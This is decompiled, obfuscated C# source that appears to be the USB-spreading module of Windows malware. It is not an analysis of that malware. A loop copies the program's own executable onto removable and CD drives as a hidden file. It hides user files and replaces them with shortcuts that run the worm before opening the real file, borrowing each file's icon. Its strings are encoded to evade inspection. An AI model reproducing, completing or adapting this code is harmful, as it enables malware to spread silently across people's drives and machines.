using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns0;

public class GClass0
{
	public class GClass1
	{
		public string string_0;

		public List<string> list_0;

		public List<string> list_1;

		public GClass1()
		{
			list_0 = new List<string>();
			list_1 = new List<string>();
		}
	}

	private bool bool_0;

	private Thread thread_0;

	public string string_0;

	public Collection collection_0;

	public GClass0()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		bool_0 = false;
		thread_0 = null;
		collection_0 = new Collection();
	}

	public void method_0()
	{
		if (thread_0 == null)
		{
			thread_0 = new Thread(method_2, 1);
			thread_0.Start();
		}
	}

	public void method_1()
	{
		bool_0 = true;
		while (thread_0 != null)
		{
			Thread.Sleep(1);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (!driveInfo.IsReady || !((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
				{
					continue;
				}
				if (File.Exists(driveInfo.Name + string_0))
				{
					File.SetAttributes(driveInfo.Name + string_0, FileAttributes.Normal);
					File.Delete(driveInfo.Name + string_0);
				}
				string[] files = Directory.GetFiles(driveInfo.Name);
				foreach (string text in files)
				{
					try
					{
						File.SetAttributes(text, FileAttributes.Normal);
						if (text.ToLower().EndsWith(GClass4.smethod_0("*ůɬ\u036a")))
						{
							File.Delete(text);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] directories = Directory.GetDirectories(driveInfo.Name);
				foreach (string path in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						directoryInfo.Attributes = FileAttributes.Normal;
						directoryInfo = null;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void method_2()
	{
		thread_0 = null;
		method_1();
		thread_0 = Thread.CurrentThread;
		bool_0 = false;
		while (!bool_0)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					GClass1 gClass;
					if (!collection_0.Contains(driveInfo.Name.ToLower()))
					{
						gClass = new GClass1();
						gClass.string_0 = driveInfo.Name;
						collection_0.Add((object)gClass, driveInfo.Name.ToLower(), (object)null, (object)null);
					}
					else
					{
						gClass = (GClass1)collection_0.get_Item(driveInfo.Name.ToLower());
					}
					if (bool_0)
					{
						goto end_IL_002f;
					}
					try
					{
						if (!driveInfo.IsReady || !(((driveInfo.TotalFreeSpace > 0L) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
						{
							continue;
						}
						try
						{
							if (!File.Exists(driveInfo.Name + string_0))
							{
								File.Copy(Application.get_ExecutablePath(), driveInfo.Name + string_0, overwrite: true);
								File.SetAttributes(driveInfo.Name + string_0, FileAttributes.Hidden);
							}
							string[] files = Directory.GetFiles(driveInfo.Name);
							foreach (string text in files)
							{
								if (!((Operators.CompareString(Path.GetExtension(text)!.ToLower(), GClass4.smethod_0("*ůɬ\u036a"), false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + string_0.ToLower(), false) != 0)))
								{
									continue;
								}
								if (!gClass.list_0.Contains(new FileInfo(text).get_Name()))
								{
									if (gClass.list_0.Count < 20)
									{
										method_3(driveInfo, text, method_4(Path.GetExtension(text)));
										gClass.list_0.Add(new FileInfo(text).get_Name());
										File.SetAttributes(text, FileAttributes.Hidden);
										gClass.list_1.Add(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + GClass4.smethod_0("*ůɬ\u036a")));
									}
								}
								else if (gClass.list_0.Contains(new FileInfo(text).get_Name()))
								{
									if (File.GetAttributes(text) != FileAttributes.Hidden)
									{
										File.SetAttributes(text, FileAttributes.Hidden);
									}
									if (!File.Exists(driveInfo.Name + new FileInfo(text).get_Name() + GClass4.smethod_0("*ůɬ\u036a")))
									{
										method_3(driveInfo, text, method_4(Path.GetExtension(text)));
									}
									else if (Operators.CompareString(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + GClass4.smethod_0("*ůɬ\u036a")), gClass.list_1[gClass.list_0.IndexOf(new FileInfo(text).get_Name())], false) != 0)
									{
										method_3(driveInfo, text, method_4(Path.GetExtension(text)));
									}
								}
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(3000);
			continue;
			end_IL_002f:
			break;
		}
		thread_0 = null;
	}

	public object method_3(DriveInfo driveInfo_0, string string_1, string string_2)
	{
		try
		{
			File.Delete(driveInfo_0.Name + new FileInfo(string_1).get_Name() + GClass4.smethod_0("*ůɬ\u036a"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		object obj = NewLateBinding.LateGet(Interaction.CreateObject(GClass4.smethod_0("Zşɨ\u0378Ѡոٳܨࡖ६੦୮౭"), GClass4.smethod_0("")), (Type)null, GClass4.smethod_0("Mſɩ\u036aѾլ\u065bݯࡩॷ\u0a70ୠ౷൵"), new object[1] { driveInfo_0.Name + new FileInfo(string_1).get_Name() + GClass4.smethod_0("*ůɬ\u036a") }, (string[])null, (Type[])null, (bool[])null);
		NewLateBinding.LateSetComplex(obj, (Type)null, GClass4.smethod_0("^Ũɺ\u0360ѣձ\u0654ݢ\u0876३"), new object[1] { GClass4.smethod_0("dūɡ\u032aѦպ٤") }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, GClass4.smethod_0("GŠɼ\u0366ѥե٭ݍࡡॵ\u0a63୦\u0c70൬\u0e70\u0f78"), new object[1] { GClass4.smethod_0("") }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, GClass4.smethod_0("HźɠͳѨա٭ݶ\u0872"), new object[1] { GClass4.smethod_0("&ūȧ\u0375ѱեٱݶ\u0821") + string_0.Replace(GClass4.smethod_0("!"), GClass4.smethod_0("!Ģȣ")) + GClass4.smethod_0("3űɫ\u0362ѽտٽݫ\u087fबਤ\u0b78౦൧\u0e73༪ဧᄡቀፆᐤ") + new DirectoryInfo(string_1).get_Name() + GClass4.smethod_0("*ħȠ\u0325ѡջ٫ݵ") }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, GClass4.smethod_0("EŨɥ\u0367фը٥ݤ\u0870४੭୯"), new object[1] { string_2 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("WŢɴ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		obj = null;
		object result = default(object);
		return result;
	}

	public string method_4(string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GClass4.smethod_0("BſɩͺѺխٹݯࡕ\u094b੫୧\u0c76൷\u0e66\u0f71ၝ"), writable: false);
			string text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(string_1, writable: false)!.GetValue(GClass4.smethod_0("")), (object)GClass4.smethod_0("Qňɮ\u036cѨս٫ݲࡌ१੬୬\u0c5d"))))!.GetValue(GClass4.smethod_0(""), GClass4.smethod_0("")));
			if (!text.Contains(GClass4.smethod_0("-")))
			{
				text += GClass4.smethod_0(".ı");
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = GClass4.smethod_0("");
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
